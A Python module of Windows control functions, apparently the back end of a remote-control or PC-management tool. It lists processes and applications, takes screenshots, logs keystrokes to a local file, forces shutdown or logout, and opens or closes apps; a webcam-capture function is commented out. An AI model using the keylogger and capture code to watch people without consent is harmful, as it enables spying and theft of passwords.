import wmi
import subprocess
import os
import logging
import keyboard
import cv2 as cv
import time
from AppOpener import open, close
from pynput.keyboard import Listener
from PIL import ImageGrab
from PIL import Image


def listRunningProcess():
    runningProcess = []
    f = wmi.WMI()
    for process in f.Win32_Process():
        processInfo = { 'PID': process.ProcessId, 'Name': process.Name}
        runningProcess.append(processInfo)
    
    return runningProcess


def listRunningApplication():
    runningApp = []
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    stdout = proc.communicate()
    
    for line in stdout[0].decode().split('\n'):
        line = line.strip()
        if line:
            runningApp.append(line)
            
    return runningApp 


def screenshot():
    screenshotImage = ImageGrab.grab()
    curDir = os.getcwd()
    screenshotImage.save(os.path.join(curDir, "screenshot.png"))
    
    
def keylogger(duration):
    recorded_keys = []
    escape = False
    def on_key_event(e):
        nonlocal escape
        if e.event_type == keyboard.KEY_UP:
            key = e.name
            if key == "esc":
                escape = True
            else:
                recorded_keys.append(key)

    keyboard.hook(on_key_event)
    start = time.time()
    while(time.time() - start) < duration and not escape:
        pass
    
    keyboard.unhook_all()
    
    with open("keylogger.txt", "w") as file:
        for kl in recorded_keys:
            file.write(kl)


def shutdown():
    os.system("shutdown /s /t 1")

# def listDir(path):
#     dirList = os.listdir(path)
#     for folder in dirList:
#         print(folder)
        

# def captureWebcam():
#     cap = cv.VideoCapture(0)
#     if not cap.isOpened():
#         print("Cannot open camera")
#     else:
#         bool, image = cap.read()
#         if bool:
#             toRGB = cv.cvtColor(image, cv.COLOR_BGR2RGB)
#             image = Image.fromarray(toRGB)
#             path = os.getcwd()
#             image.save(os.path.join(path, "webcamCapture.png"))
#         else:
#             print("Unable to capture")

def logout():
    os.system("shutdown -l")
    
def removeSpace(string):
    return string.replace(" ", "")

def closeApplication(process_name):
    process_name = removeSpace(process_name)
    close(process_name.lower())
                
                
def openApplication(appName):
    # try:
    #     subprocess.run(["where", appName], check=True, capture_output=True)
    # except subprocess.CalledProcessError:
    #     print(f"{appName} is not exist")
    #     return 

    open(appName.lower())
    
    # isRunning = False    
    # runningApps = listRunningProcess()
    # for app in runningApps:
    #     if app == appName:
    #         isRunning = True
                
    # if isRunning == False:
    #     print(f"{appName} is not exist")